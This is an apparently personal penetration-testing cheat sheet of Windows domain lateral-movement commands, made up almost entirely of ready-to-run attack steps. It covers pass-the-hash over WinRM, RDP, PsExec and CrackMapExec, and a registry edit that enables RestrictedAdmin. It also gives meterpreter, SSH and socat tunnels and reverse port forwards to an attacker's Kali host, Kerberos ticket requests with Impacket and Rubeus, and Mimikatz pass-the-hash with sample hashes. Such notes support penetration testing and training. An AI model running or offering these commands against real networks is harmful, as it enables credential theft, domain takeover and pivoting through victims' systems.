### WinRM
```
# Windows
Enter-PSSession -ComputerName dc03.infinity.com
# Kali
evil-winrm -u infinity.com\\administrastor -H [NTHash] -i 192.168.151.120
```

### RDP
```
# If restrictedadmin is allowed.
xfreerdp /u:administrator /pth:[NTHash] /v:172.16.184.152 +compression +clipboard /dynamic-resolution+toggle-fullscreen /cert-ignore

# Enable restrictedadmin
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
"DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

# Using cleartext credentials
rdesktop 172.16.184.152
```

### PsExec
```
# Local user
proxychains -q python examples/psexec.py sql07/Administrator@172.16.184.152 -hashes aad3b435b51404eeaad3b435b51404ee:[NTHash]

# Domain user
proxychains -q python examples/psexec.py Administrator@172.16.184.151 -hashes aad3b435b51404eeaad3b435b51404ee:[NTHash]
```

### Tunneling
```
# SOCKS5 using meterpreter
use multi/manage/autoroute
set session 2
exploit
use auxiliary/server/socks_proxy
run
# add "socks5 127.0.0.1 1080" to /etc/proxychains.conf

# SOCKS5 using SSH
ssh -R 8888 root@192.168.45.229

# Port forwarding using meterpreter:
portfwd add -l 3389 -p 3389 -r 172.16.176.194

# Port forwarding using SSH:
# https://gist.github.com/billautomata/ee0572113e1496a75b03
# First, edit the GatewayPorts setting in /etc/ssh/sshd_config and restart SSH
# Open 443 port on Kali and forward all connections to 192.168.45.234:443
ssh -i id_rsa -R 0.0.0.0:443:192.168.45.234:443 root@Kali

# Port forwarding using socat
# https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
# All connections to 443 will be redirected to 
socat TCP-LISTEN:443,fork TCP:192.168.45.234:443

# NMAP using proxychains
proxychains nmap -sT -PN -n -sV 172.16.167.187 -p 445
```

### CrackMapExec
```
# Cleartext via SMB
proxychains -q crackmapexec smb 172.16.184.150-172.16.184.160 -u will -p '123456'

# Local auth PTH via SMB
proxychains -q crackmapexec smb 172.16.184.150-172.16.184.155 -u Administrator -H [NTHash] --local-auth
```

### MSSQL
```
python examples/mssqlclient.py will:123456@172.16.184.151 -port 1433 -windows-auth
```

### Kerberos
```
# Ask TGT using Impacket
proxychains -q python examples/getTGT.py tricky.com/sqlsvc -dc-ip 172.16.184.150 -hashes :1ef8ec7a4e862ed968d4d335afb77215
KRB5CCNAME=sqlsvc.ccache

# Ask TGT using Rubeus
.\Rubeus.exe asktgt /user:administrator /domain:infinity.com /rc4:5f9163ca3b673adfff2828f368ca3760 /ptt
# Load Kerberos ticket:
Rubeus.exe ptt /ticket:base64
```

### Pass the Hash
```
# Using Mimikatz
privilege::debug
sekurlsa::pth /user:sqlsvc /domain:tricky.com /ntlm:1ef8ec7a4e862ed968d4d335afb77215
```
